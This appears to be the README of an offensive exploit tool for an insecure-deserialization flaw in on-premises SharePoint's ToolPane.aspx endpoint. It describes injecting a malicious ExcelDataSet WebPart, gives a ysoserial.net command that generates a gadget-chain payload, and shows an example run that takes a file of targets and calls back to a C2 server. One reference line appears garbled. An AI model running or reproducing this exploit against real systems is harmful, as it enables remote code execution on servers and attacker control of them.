# SharePoint WebPart Injection Exploit Tool

### Exploit Tool for SharePoint's ToolPane.aspx WebPart Injection Vulnerability

* **Component**: Microsoft SharePoint (on-prem)
* **Endpoint**: `/layouts/15/ToolPane.aspx`
* **Vulnerable Parameter**: `MSOTlPn_DWP`
* **Exploited Object**: `<Scorecard:ExcelDataSet CompressedDataTable="...">`
* **Vulnerability Class**: Insecure deserialization (gadget chain)

## How It Works

1. Authenticated users can send POST requests to `/ToolPane.aspx?DisplayMode=Edit`.
2. WebParts defined via the `MSOTlPn_DWP` parameter are parsed as XML and instantiated.
3. By injecting a malicious `Scorecard:ExcelDataSet` WebPart, you can load compressed (deflated) serialized .NET objects.
4. These are then deserialized by internal SharePoint code using unsafe deserializers like `BinaryFormatter`.
5. By chaining gadgets (e.g., `LosFormatter`, `ObjectDataProvider`), remote code execution can be achieved.

## Requirements

* Python 3.x
* `requests`, `urllib3`, `termcolor`
* A payload file generated via a .NET gadget chain (e.g., using `ysoserial.net`)

## ysoserial.net

Generate test payloads using the awesome [ysoserial.net](https://github.com/pwntester/ysoserial.net):
ttps/tools/microsoft/ysoserial.net

```bash
ysoserial.exe -f LosFormatter -g ObjectDataProvider -o base64 -c "calc.exe"
```

Then compress with GZIP and embed in the DWP field.

## Payload Structure

Payload is expected to be:

* A GZIP-compressed serialized `.NET DataSet` object
* Embedded in the `CompressedDataTable` property inside an XML WebPart

The payload chain can include types like:

* `System.Data.DataSet`
* `System.Data.Services.Internal.ExpandedWrapper`
* `System.Web.UI.LosFormatter`
* `System.Windows.Data.ObjectDataProvider`

More info: [Reference Payload](https://gist.githubusercontent.com/gboddin/6374c04f84b58cef050f5f4ecf43d501)

## Example Usage

```bash
python3 exploit.py -t targets.txt --file payload.txt  --c2 http://YOUR_C2_SERVER:8000  --proxy http://127.0.0.1:8080
```

